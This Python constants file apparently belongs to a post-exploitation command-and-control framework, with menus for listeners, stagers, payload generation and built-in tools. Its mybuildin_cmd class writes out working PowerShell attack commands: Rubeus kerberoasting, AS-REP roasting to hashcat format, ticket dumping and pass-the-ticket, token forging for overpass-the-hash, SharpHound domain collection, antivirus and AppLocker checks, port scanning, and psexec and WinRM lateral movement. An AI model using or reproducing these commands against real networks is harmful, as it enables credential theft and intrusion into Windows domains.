"""
build in constants ...
"""


class myconstant():
    def __init__(self):

        self.SOCKET_TIMEOUT = 5
        self.PFW_ACK_SPEED = 2
        self.PFW_UPDATE_SPEED = 5
        self.PFW_NATIVE_SOCKET_TIMEOUT = 2

        self.TAG_MYCS = "[MYCS]"
        self.TAG_LISTENER = "[Listener]"
        self.TAG_INTE_STAGER = "[Interact]"
        self.TAG_PIPE_LISTENER = "[Pipe Listener]"
        self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"
        self.TAG_PAYLOAD = "[Payload]"
        self.TAG_STAGER_TOOLS = "[Tools]"
        self.TAG_PIPE_STAGER_TOOLS = "[Pipe Tools]"
        self.TAG_LOCALSERVER = "[Local]"


        self.CMD_USELISTENER = "uselistener"
        self.CMD_INTERACTSTAGER = "stager"
        self.CMD_PIPE_INTERACTSTAGER = "pstager"
        self.CMD_USEPIPELISTENER = "usepipelistener"
        self.CMD_PAYLOAD = "payload"
        self.CND_LOCALSERVER = "localserver"
        self.CMD_HELP = "help"
        self.CMD_EXIT = "exit"
        self.CMD_AUTOLIST = [self.CMD_USEPIPELISTENER,self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT,self.CMD_PIPE_INTERACTSTAGER,self.CMD_PAYLOAD,self.CND_LOCALSERVER]

        self.CMD_BACK = "back"
        self.CMD_LOCALSERVER_GETINFO = "info"
        self.CMD_LOCALSERVER_SETCONFIG = "set"
        self.CMD_LOCALSERVER_START = "start"
        self.CMD_LOCALSERVER_STOP = "stop"
        self.CMD_LOCALSERVER_LIST = "list"
        self.CMD_LOCALSERVER_AUTOLIST = [self.CMD_LOCALSERVER_GETINFO,self.CMD_LOCALSERVER_SETCONFIG,self.CMD_LOCALSERVER_START,self.CMD_LOCALSERVER_STOP,self.CMD_LOCALSERVER_LIST,self.CMD_BACK]

        
        self.CMD_LISTENER_GETINFO = "info"
        self.CMD_LISTENER_SETHOSTNAME = "sethost"
        self.CMD_LISTENER_SETPORT = "setport"
        self.CMD_LISTENER_START = "start"
        self.CMD_LISTENER_LIST = "list"
        self.CMD_LISTENER_STOP = "stop"
        self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
                                    self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]

        self.CMD_STAGER_GET_LIST = "list"
        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_STAGER_GET_INTO = "into"
        self.CMD_STAGER_GET_HISTORY = "history"
        self.CMD_STAGER_LOAD_PS = "psload"
        self.CMD_STAGER_CON = "connect"
        self.CMD_STAGER_PFW = "pfw"
        self.CMD_STAGER_PFW_STOP = "pfw-stop"
        self.CMD_STAGER_PFW_SP = "pfw-speed"
        self.CMD_STAGER_FWC = "fwc"
        self.CMD_STAGER_BUILDIN = "tools"
        self.CMD_STAGER_VERBOSE = "verbose"
        self.CMD_STAGER_CLEAN_HISTORY = "history-clean"
        self.CMD_STAGER_RESTORE_HISTORY = "history-restore"
        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_RUNNING_LIST,self.CMD_STAGER_GET_INTO,
                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW,self.CMD_STAGER_BUILDIN,
                                        self.CMD_STAGER_VERBOSE,self.CMD_STAGER_PFW_SP,self.CMD_STAGER_FWC,self.CMD_STAGER_PFW_STOP,self.CMD_STAGER_CLEAN_HISTORY,self.CMD_STAGER_RESTORE_HISTORY]

        
        self.CMD_STAGER_TOOLS_IF64BIT = "if64"
        self.CMD_STAGER_TOOLS_GETNETVERSION = "getnet"
        self.CMD_STAGER_TOOLS_GETNETVERSION2 = "getnet2"
        self.CMD_STAGER_TOOLS_GETAV = "getav"
        self.CMD_STAGER_TOOLS_GETAL = "getal"
        self.CMD_STAGER_TOOLS_GETCLM = "getclm"
        self.CMD_STAGER_TOOLS_MAKETOKEN = "maketoken"
        
        self.CMD_STAGER_TOOLS_INJECT = "inject"
        self.CMD_STAGER_TOOLS_GETPID = "getpid"
        self.CMD_STAGER_TOOLS_GETPSTREE = "getps"
        self.CMD_STAGER_TOOLS_GETPSTREE2 = "getps2"
        
        self.CMD_STAGER_TOOLS_GETDOMAIN = "getdomain"
        self.CMD_STAGER_TOOLS_WHOAMI = "whoami"
        self.CMD_STAGER_TOOLS_HOSTNAME = "hostname"
        self.CMD_STAGER_TOOLS_CD = "cd"
        self.CMD_STAGER_TOOLS_LS = "ls"
        self.CMD_STAGER_TOOLS_DOWNLOAD = "download"

        self.CMD_STAGER_TOOLS_SHARPHOUND3 = "sharphound3"
        
        self.CMD_STAGER_TOOLS_SPAWN_PS = "spawnps"
        self.CMD_STAGER_TOOLS_PSRESET = "psreset"
        self.CMD_STAGER_TOOLS_PSEXEC = "psexec"
        self.CMD_STAGER_TOOLS_PSREMOTE = "psremote"
        self.CMD_STAGER_TOOLS_PSJUMP = "psjump"
        self.CMD_STAGER_TOOLS_PSJUMP_EXE = "psjump-exe"

        self.CMD_STAGER_TOOLS_RUBEUS_KERBER = "kerberoast"
        self.CMD_STAGER_TOOLS_RUBEUS_ASREP = "asreproast"
        self.CMD_STAGER_TOOLS_RUBEUS_ASKTGT = "rubeus-asktgt"
        self.CMD_STAGER_TOOLS_RUBEUS_DELEG = "rubeus-tgtdeleg"
        self.CMD_STAGER_TOOLS_RUBEUS_TRIAGE = "rubeus-triage"
        self.CMD_STAGER_TOOLS_RUBEUS_PURGE = "rubeus-purge"
        self.CMD_STAGER_TOOLS_RUBEUS_IMPORT = "rubeus-import"
        self.CMD_STAGER_TOOLS_RUBEUS_DUMP = "rubeus-dump"
        self.CMD_STAGER_TOOLS_RUBEUS_SAVE = "rubeus-save"


        self.CMD_STAGER_TOOLS_MSF = "msf"

        self.CMD_STAGER_TOOLS_PORTSCAN = "portscan"

        self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK, self.CMD_STAGER_GET_HISTORY, self.CMD_STAGER_VERBOSE, self.CMD_STAGER_TOOLS_IF64BIT, self.CMD_STAGER_TOOLS_GETNETVERSION, self.CMD_STAGER_TOOLS_GETNETVERSION2, 
                                            self.CMD_STAGER_TOOLS_GETAV, self.CMD_STAGER_TOOLS_GETAL, self.CMD_STAGER_TOOLS_GETCLM, self.CMD_STAGER_TOOLS_MAKETOKEN, 
                                            self.CMD_STAGER_TOOLS_INJECT, self.CMD_STAGER_TOOLS_GETPID, self.CMD_STAGER_TOOLS_GETPSTREE, self.CMD_STAGER_TOOLS_GETPSTREE2,
                                            self.CMD_STAGER_TOOLS_GETDOMAIN, self.CMD_STAGER_TOOLS_WHOAMI, self.CMD_STAGER_TOOLS_HOSTNAME, self.CMD_STAGER_TOOLS_CD, 
                                            self.CMD_STAGER_TOOLS_LS, self.CMD_STAGER_TOOLS_DOWNLOAD, self.CMD_STAGER_TOOLS_SHARPHOUND3, self.CMD_STAGER_TOOLS_SPAWN_PS, 
                                            self.CMD_STAGER_TOOLS_PSRESET, self.CMD_STAGER_TOOLS_PSEXEC, self.CMD_STAGER_TOOLS_PSREMOTE, self.CMD_STAGER_TOOLS_PSJUMP, 
                                            self.CMD_STAGER_TOOLS_PSJUMP_EXE,self.CMD_STAGER_TOOLS_RUBEUS_KERBER,self.CMD_STAGER_TOOLS_RUBEUS_ASREP,self.CMD_STAGER_TOOLS_RUBEUS_ASKTGT,
                                            self.CMD_STAGER_TOOLS_RUBEUS_DELEG,self.CMD_STAGER_TOOLS_RUBEUS_TRIAGE,self.CMD_STAGER_TOOLS_RUBEUS_PURGE,self.CMD_STAGER_TOOLS_RUBEUS_IMPORT,
                                            self.CMD_STAGER_TOOLS_RUBEUS_DUMP,self.CMD_STAGER_TOOLS_RUBEUS_SAVE,
                                            self.CMD_STAGER_TOOLS_MSF,self.CMD_STAGER_TOOLS_PORTSCAN]

        self.CMD_PIPE_LISTENER_GETINFO = "info"
        self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
        self.CMD_PIPE_LISTENER_START = "start"
        self.CMD_PIPE_LISTENER_LIST = "list"
        self.CMD_PIPE_LISTENER_STOP = "stop"
        self.CMD_PIPE_LISTENER_AUTOLIST = [self.CMD_PIPE_LISTENER_GETINFO,self.CMD_PIPE_LISTENER_SETPIPENAME,self.CMD_PIPE_LISTENER_START,
                                            self.CMD_PIPE_LISTENER_LIST,self.CMD_PIPE_LISTENER_STOP,self.CMD_BACK]
        
        self.CMD_PIPE_STAGER_GET_LIST = "list"
        self.CMD_PIPE_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_PIPE_STAGER_GET_INTO = "into"
        self.CMD_PIPE_STAGER_GET_HISTORY = "history"
        self.CMD_PIPE_STAGER_CON = "connect"
        self.CMD_PIPE_STAGER_BUILDIN = "tools"
        self.CMD_PIPE_STAGER_VERBOSE = "verbose"

        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,
                                            self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST,self.CMD_PIPE_STAGER_CON,self.CMD_PIPE_STAGER_BUILDIN,
                                            self.CMD_PIPE_STAGER_VERBOSE]
        #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
        #self.CMD_PIPE_STAGER_CON = "connect" 


        self.CMD_PIPE_STAGER_TOOLS_IF64BIT = "if64"
        self.CMD_PIPE_STAGER_TOOLS_GETNETVERSION = "getnet"
        self.CMD_PIPE_STAGER_TOOLS_GETNETVERSION2 = "getnet2"
        self.CMD_PIPE_STAGER_TOOLS_GETAV = "getav"
        self.CMD_PIPE_STAGER_TOOLS_GETAL = "getal"
        self.CMD_PIPE_STAGER_TOOLS_GETCLM = "getclm"
        self.CMD_PIPE_STAGER_TOOLS_MAKETOKEN = "maketoken"
        
        self.CMD_PIPE_STAGER_TOOLS_INJECT = "inject"
        self.CMD_PIPE_STAGER_TOOLS_GETPID = "getpid"
        self.CMD_PIPE_STAGER_TOOLS_GETPSTREE = "getps"
        self.CMD_PIPE_STAGER_TOOLS_GETPSTREE2 = "getps2"
        
        self.CMD_PIPE_STAGER_TOOLS_GETDOMAIN = "getdomain"
        self.CMD_PIPE_STAGER_TOOLS_WHOAMI = "whoami"
        self.CMD_PIPE_STAGER_TOOLS_HOSTNAME = "hostname"
        self.CMD_PIPE_STAGER_TOOLS_CD = "cd"
        self.CMD_PIPE_STAGER_TOOLS_LS = "ls"
        #self.CMD_STAGER_TOOLS_DOWNLOAD = "download"

        self.CMD_PIPE_STAGER_TOOLS_SHARPHOUND3 = "sharphound3"
        
        self.CMD_PIPE_STAGER_TOOLS_SPAWN_PS = "spawnps"
        self.CMD_PIPE_STAGER_TOOLS_PSRESET = "psreset"
        self.CMD_PIPE_STAGER_TOOLS_PSEXEC = "psexec"
        #self.CMD_STAGER_TOOLS_PSREMOTE = "psremote"
        #self.CMD_STAGER_TOOLS_PSJUMP = "psjump"
        #self.CMD_STAGER_TOOLS_PSJUMP_EXE = "psjump-exe"

        self.CMD_PIPE_STAGER_TOOLS_KERBER = "kerberoast"
        self.CMD_PIPE_STAGER_TOOLS_ASREP = "asreproast"

        #self.CMD_STAGER_TOOLS_MSF = "msf"

        self.CMD_PIPE_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_PIPE_STAGER_GET_HISTORY,self.CMD_PIPE_STAGER_VERBOSE,self.CMD_PIPE_STAGER_TOOLS_IF64BIT,self.CMD_PIPE_STAGER_TOOLS_GETNETVERSION,self.CMD_PIPE_STAGER_TOOLS_GETNETVERSION2,
                                                self.CMD_PIPE_STAGER_TOOLS_GETAV,self.CMD_PIPE_STAGER_TOOLS_GETAL,self.CMD_PIPE_STAGER_TOOLS_GETCLM,self.CMD_PIPE_STAGER_TOOLS_MAKETOKEN,
                                                self.CMD_PIPE_STAGER_TOOLS_INJECT,self.CMD_PIPE_STAGER_TOOLS_GETPID,self.CMD_PIPE_STAGER_TOOLS_GETPSTREE,self.CMD_PIPE_STAGER_TOOLS_GETPSTREE2,
                                                self.CMD_PIPE_STAGER_TOOLS_GETDOMAIN,self.CMD_PIPE_STAGER_TOOLS_WHOAMI,self.CMD_PIPE_STAGER_TOOLS_HOSTNAME,self.CMD_PIPE_STAGER_TOOLS_CD,
                                                self.CMD_PIPE_STAGER_TOOLS_LS,self.CMD_PIPE_STAGER_TOOLS_SHARPHOUND3,self.CMD_PIPE_STAGER_TOOLS_SPAWN_PS,self.CMD_PIPE_STAGER_TOOLS_PSRESET,
                                                self.CMD_PIPE_STAGER_TOOLS_PSEXEC,
                                                self.CMD_PIPE_STAGER_TOOLS_KERBER,self.CMD_PIPE_STAGER_TOOLS_ASREP]


        self.CMD_PAYLOAD_SETCONFIG = "set"
        self.CMD_PAYLOAD_GEN = "start"
        self.CMD_PAYLOAD_INFO = "info"
        self.CMD_PAYLOAD_GTOJS = "gtojs"
        self.CMD_PAYLOAD_PHTA = "pexechta"
        self.CMD_PAYLOAD_AUTOLIST = [self.CMD_PAYLOAD_PHTA,self.CMD_PAYLOAD_GTOJS,self.CMD_PAYLOAD_SETCONFIG,self.CMD_PAYLOAD_GEN,self.CMD_PAYLOAD_INFO,self.CMD_BACK]




class myconstant_networking(): #applicaiton layer tag
    def __init__(self):
        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
        self.PSRESET = "PSRESET_SUCCESS"
        self.PIPE_CONNECTED = "PIPE_CONNECTED"
        self.FW_NOTREADY = "FW_NOTREADY"
        self.FW_SUCCESS = "FW_SUCCESS" #for remote startup
        self.FW_LOCAL_SUCCESS = "FW_LOCAL_SUCCESS" #for local startup
        self.FW_LOCAL_ERROR = "FW_LOCAL_ERROR" #for local startup
        self.FW_CH_FINED = "FW_CH_FINED"
        self.DL_SUCCESS = "DL_SUCCESS"
        self.PSREMOTE_SUCCESS = "PSREMOTE_SUCCESS"
        self.FW_CH_NODATA = "FW_CH_NODATA"
        self.FW_CH_CLOSE_SUCCESS = "FW_CH_CLOSE_SUCCESS" #for server side fin


class mybuildin_cmd():
    def __init__(self):
        self.IF64BIT = "[Environment]::Is64BitProcess"
        self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
        self.GETNETVERSION2 = "gci 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | gp -name Version,Release -EA 0 | ?{ $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release"
        self.GETDEFENDER = "Get-MpComputerStatus"
        self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
        self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"

        #overpassthehash
        self.OPH_INIT = "$token = [SharPsplOit.Credentials.Tokens]::new()"
        self.OPH_NEWTOKEN = "$token.MakeToken(\"{}\",\"{}\",\"{}\")"
        
        self.GETPSTREE = "Get-ProcessTree -Verbose | FT Id, Level, IndentedName,ParentId,Owner -AutoSize"
        self.GETPSTREE2 = "Get-ProcessTree -Verbose | FT Id, Level, IndentedName,ParentId,Path,CommandLine,Owner -AutoSize"

        self.GETPID = "$pid"
        self.SHARPHOUND3 = "Invoke-Sharphound3 \"-c All GPOLocalGroup -D {}\""
        self.GETDOMAIN = "Get-Domain"

        self.NET_CD = "[Environment]::CurrentDirectory = (Get-Location -PSProvider FileSystem).ProviderPath"
        self.PSREMOTE = "http://{}:5985/WSMAN"

        self.PSJOB = "Start-Job -ScriptBlock ${{function:{}}}"
        self.HOSTNAME = "hostname"
        self.WHOAMI = "whoami"

        self.B64_SAVE = "echo {} | out-file {}\\{}.txt"

        self.KERBER = "Invoke-Rubeus kerberoast"
        self.ARSREP_HC = "Invoke-Rubeus \"asreproast /format:hashcat\""
        self.ARSREP = "Invoke-Rubeus asreproast"
        self.TRIAGE = "Invoke-Rubeus triage"
        self.DELEG = "Invoke-Rubeus tgtdeleg"
        self.PURGE = "Invoke-Rubeus purge"
        self.PTT = "Invoke-Rubeus \"ptt /ticket:{}\""


        self.PORTSCAN = "80,8080,445,139,135,3389,1433,5985,47001 | % {{if ((new-object Net.Sockets.TcpClient).ConnectAsync(\"{}\",$_).Wait({})){{\"Port $_ is open!\"}}else{{\"Port $_ is Closed\"}}}} 2>$null"


if __name__ == "__main__":
    __t_mybuildin = mybuildin_cmd()
    print(__t_mybuildin.PORTSCAN.format("thisistheip","thisisthetimeout"))
